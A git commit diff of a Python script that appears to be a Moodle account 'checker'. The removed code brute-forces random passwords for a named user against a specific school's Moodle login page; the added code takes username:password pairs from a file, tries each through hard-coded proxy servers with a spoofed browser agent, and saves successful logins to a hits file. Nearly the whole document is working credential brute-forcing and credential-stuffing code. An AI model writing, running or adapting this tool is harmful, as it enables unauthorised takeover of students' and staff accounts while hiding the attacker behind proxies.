5139b19e8e630d46ff9c49a5612aa7dd71b848ca
EverStarck <EverStarckOne@protonmail.com>
2021-05-14 15:04:26 -0500

    :)

--- checker.py
+++ checker.py
@@ -1,25 +1,42 @@
 import requests
 import re
-import math
-import random 
-import threading
-import time
-from itertools import combinations
 import sys
+import time
+import random
+from bs4 import BeautifulSoup
 
-url = "https://moodle2.helmholtz-karlsruhe.de/moodle/blocks/exa2fa/login/"
+url = ""  # URL of the login page
+checkIfLoginItem = "" # Url of some a tag that is only when you are in. It could be something like "https://myMoodle.com/user/files.php"
+
+
 loginTokenRegex = re.compile('type="hidden" name="logintoken" value="(\w*)"', re.IGNORECASE)
-threadCount = 10
+USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0"
+headers = {"user-agent": USER_AGENT}
+
+proxyList = [
+    {"https" : "http://20.151.27.156:3128"},
+    {"https" : "http://18.139.173.12:3128"},
+    {"https" : "http://104.43.230.151:3128"},
+    {"https" : "http://51.77.123.247:80"},
+    {"https" : "http://47.89.153.213:80"},
+    {"https" : "http://14.140.131.82:3128"},
+]
+
+proxyThatWorks = {
+    "https" : "http://20.151.27.156:3128"
+}
 
 def check(username, password):
+    # random.shuffle(proxyList)
+    # proxy = proxyList[0]
+    proxy = proxyThatWorks
     try:
         req = requests.session()
-        req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"})
-        res = req.get(url)
+        req.headers.update(headers)
+        res = req.get(url,proxies=proxy)
         if res.status_code == 200:
             Ltoken = loginTokenRegex.search(res.text).group(1)
-            res2 = req.post(url, data={
-                "ajax": True,
+            res2 = req.post(url,proxies=proxy, data={
                 "anchor": "",
                 "logintoken": Ltoken,
                 "username": username,
@@ -27,44 +44,51 @@ def check(username, password):
                 "token": "",
             })
             if res2.status_code == 200:
-                err = res2.json()["error"]
-                if err == "":
+                checkIfLogin = BeautifulSoup(res2.text, "html.parser").find('a', attrs={'href':checkIfLoginItem})
+                if checkIfLogin:
                     return True
                 else:
-                    print(password + ": " + err)
                     return False
             else:
-                print("Fehler LOL2 ("+ str(res.status_code) + ")")
-                print(res2)
+                print("Error making the petition to server and logging ("+ str(res.status_code) + ")")
                 return False
         else:
-            print("Fehler LOL1 ("+ str(res.status_code) + ")") 
+            print("Error making the petition to server "+ str(res.status_code) + ")")
             return False
     except:
-        print(password + ": " + "Error")
-
-chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW1234567890,.-#+^°!"§$%&/()=?{[]}\\;:_\'*~'
-charlenght = len(chars)
-
-def numtostring(num):
-    return chars[num % charlenght] + numtostring(math.floor(num / charlenght)) if num >= charlenght else ""
+        print("Something went wrong, maybe the proxy doesn't work. You can remove it or try with another one")
 
 
-def bruteforcePasswd(username):
-    running = True
-    while running:
-        passwd = numtostring(math.floor(random.random() * math.pow(charlenght, 6)))
-        if check(username, passwd):
-            print("Found working: " + passwd)
-            running = False
+logo = ("""
+ ███▄ ▄███▓ ▒█████   ▒█████  ▓█████▄  ██▓    ▓█████  ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
+▓██▒▀█▀ ██▒▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓██▒    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
+▓██    ▓██░▒██░  ██▒▒██░  ██▒░██   █▌▒██░    ▒███   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
+▒██    ▒██ ▒██   ██░▒██   ██░░▓█▄   ▌▒██░    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
+▒██▒   ░██▒░ ████▓▒░░ ████▓▒░░▒████▓ ░██████▒░▒████▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
+░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░ ▒░▓  ░░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
+░  ░      ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ░ ░ ▒  ░ ░ ░  ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
+░      ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░   ░ ░      ░   ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
+       ░       ░ ░      ░ ░     ░        ░  ░   ░  ░░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
+                              ░                     ░                       ░                               `
+ """)
 
+print(logo)
 
-threads = []
-for i in range(threadCount):
-    thread = threading.Thread(target=bruteforcePasswd, args=("schellpa", ), daemon=True)
-    thread.start()
-    threads.append(thread)
+# Open file with accouns
+with open(sys.argv[1], 'r') as file:
+    txtContent = file.readlines()
 
-while all(t.is_alive() for t in threads):
-    time.sleep(1)
-sys.exit()
+print("Starting checking...")
+
+for user in txtContent:
+    user = user.replace("\n", "");
+    if "https" not in user:
+        user = user.split(":")
+        time.sleep(1)
+        if check(user[0],user[1]):
+            print(f"Found working: {user[0]}:{user[1]}")
+            # Write in hits file the user who is correct
+            with open("hits.txt", "a") as file:
+               file.write(f'{user[0]}:{user[1]}\n')
+
+print("All accounts is already checked. Please check hits file. Thx for use this script ;)")
